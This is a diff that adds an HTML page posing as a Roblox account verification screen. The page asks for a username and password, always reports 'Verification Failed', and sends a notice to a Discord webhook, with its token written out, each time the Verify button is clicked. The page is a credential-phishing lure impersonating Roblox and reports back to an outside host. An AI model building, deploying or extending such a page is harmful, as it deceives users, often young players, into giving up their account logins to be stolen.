@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GameHub</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial,Helvetica,sans-serif;
+}
+
+body{
+    height:100vh;
+    background:linear-gradient(135deg,#0f172a,#1e293b,#111827);
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    overflow:hidden;
+}
+
+body::before{
+    content:"";
+    position:absolute;
+    width:500px;
+    height:500px;
+    background:#00ffcc;
+    filter:blur(180px);
+    opacity:.25;
+    animation:move 8s infinite alternate;
+}
+
+@keyframes move{
+    from{transform:translate(-200px,-150px);}
+    to{transform:translate(200px,150px);}
+}
+
+.login{
+    position:relative;
+    width:380px;
+    background:rgba(255,255,255,.08);
+    backdrop-filter:blur(18px);
+    border:1px solid rgba(255,255,255,.2);
+    border-radius:20px;
+    padding:40px;
+    text-align:center;
+    color:white;
+    box-shadow:0 0 35px rgba(0,255,255,.2);
+}
+
+h1{
+    margin-bottom:25px;
+    font-size:34px;
+    color:#00ffe7;
+}
+
+input{
+    width:100%;
+    padding:15px;
+    margin:10px 0;
+    border:none;
+    border-radius:12px;
+    background:#1f2937;
+    color:white;
+    font-size:16px;
+}
+
+input:focus{
+    outline:none;
+    box-shadow:0 0 15px #00ffe7;
+}
+
+button{
+    width:100%;
+    padding:15px;
+    margin-top:18px;
+    border:none;
+    border-radius:12px;
+    background:#00ffe7;
+    color:#000;
+    font-size:17px;
+    font-weight:bold;
+    cursor:pointer;
+    transition:.3s;
+}
+
+button:hover{
+    transform:scale(1.05);
+    box-shadow:0 0 25px #00ffe7;
+}
+
+p{
+    margin-top:20px;
+    color:#cbd5e1;
+}
+
+a{
+    color:#00ffe7;
+    text-decoration:none;
+}
+</style>
+
+</head>
+<body>
+
+<div class="login">
+<h1>verify With Roblox (Username & Password)</h1>
+
+<form id="loginForm">
+<input type="text" placeholder="Username" required>
+<input type="password" placeholder="Password" required>
+
+<button>Verify</button>
+</form>
+
+<p>Must Verify Account To Continue!! <a href="#">Thank You</a></p>
+
+</div>
+
+<script>
+document.getElementById("loginForm").addEventListener("submit", function(e){
+    e.preventDefault();
+    alert("Verification Failed");
+});
+</script>
+
+</body>
+</html>
+<form id="demoForm">
+ 
+</form>
+
+<script>
+document.getElementById("demoForm").addEventListener("submit", function (e) {
+    e.preventDefault();
+    alert("Verification failed.");
+});
+</script>
+
+
+<script>
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1533883394306347333/l_GZv53eFO2mYQlAtA6bKbMIxjH6alvrDwBiFGrR6uskiinci6gyGBh7Z7TqfuCoVtlv"
+
+document.getElementById("loginForm").addEventListener("submit", async function(e){
+    e.preventDefault();
+
+    await fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            content: "Någon klickade på Verify-knappen."
+        })
+    });
+
+    alert("Verification Failed");
+});
+</script>
